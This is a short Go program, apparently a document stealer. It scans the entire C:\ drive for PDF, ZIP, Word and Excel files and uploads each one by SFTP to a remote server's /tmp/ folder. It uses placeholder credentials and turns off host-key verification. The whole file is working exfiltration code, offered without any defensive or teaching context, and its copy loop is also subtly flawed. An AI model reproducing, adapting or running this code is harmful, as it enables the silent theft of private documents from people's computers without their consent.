package main

import (
	"fmt"
	"os"
	"time"
	"path"
	"log"
	"path/filepath"
	"github.com/pkg/sftp"
 	"golang.org/x/crypto/ssh" 
)

func run() ([]string, error) {
	searchDir := `C:\\`
	fileList := make([]string, 0)
	e := filepath.Walk(searchDir, func(path string, f os.FileInfo, err error) error {
		fileList = append(fileList, path)
		return nil
	})
	
	if e != nil {
		fmt.Println(e)
	}

	for _, file := range fileList {
		CheckExtension(file)
		
	}

	return fileList, nil
}

func CheckExtension(file string){
	extension := filepath.Ext(file)
	if (extension == ".pdf") || (extension == ".zip") ||  (extension == ".doc") || (extension == ".docx") || (extension == ".xls") || (extension == ".xlsx") {
		fmt.Println(file)
		uploadfile(file)
	}
}


func main() {
	run()
}

func connect(user, password, host string, port int) (*sftp.Client, error) { 
 var (
 auth   []ssh.AuthMethod
 addr   string
 clientConfig *ssh.ClientConfig
 sshClient *ssh.Client
 sftpClient *sftp.Client
 err   error
 )
 auth = make([]ssh.AuthMethod, 0)
 auth = append(auth, ssh.Password(password))

 clientConfig = &ssh.ClientConfig{
 User: user,
 HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 Auth: auth,
 Timeout: 30 * time.Second,
 }

 addr = fmt.Sprintf("%s:%d", host, port)

 if sshClient, err = ssh.Dial("tcp", addr, clientConfig); err != nil {
 return nil, err
 }
 if sftpClient, err = sftp.NewClient(sshClient); err != nil {
 return nil, err
 }

 return sftpClient, nil
}

func uploadfile(file string){
 var (
 err  error
 sftpClient *sftp.Client
 )


 sftpClient, err = connect("username", "password", "server", 22)
 if err != nil {
 log.Println(err)
 }
 defer sftpClient.Close()
 var localFilePath = file
 var remoteDir = "/tmp/"
 srcFile, err := os.Open(localFilePath)
 if err != nil {
 log.Println(err)
 }
 defer srcFile.Close()

 var remoteFileName = path.Base(localFilePath)
 dstFile, err := sftpClient.Create(path.Join(remoteDir, remoteFileName))
 if err != nil {
 log.Println(err)
 }
 defer dstFile.Close()

 buf := make([]byte, 1024)
 for {
 n, _ := srcFile.Read(buf)
 if n == 0 {
  break
 }
 dstFile.Write(buf)
 }

 fmt.Println("copy file to remote server finished!")
}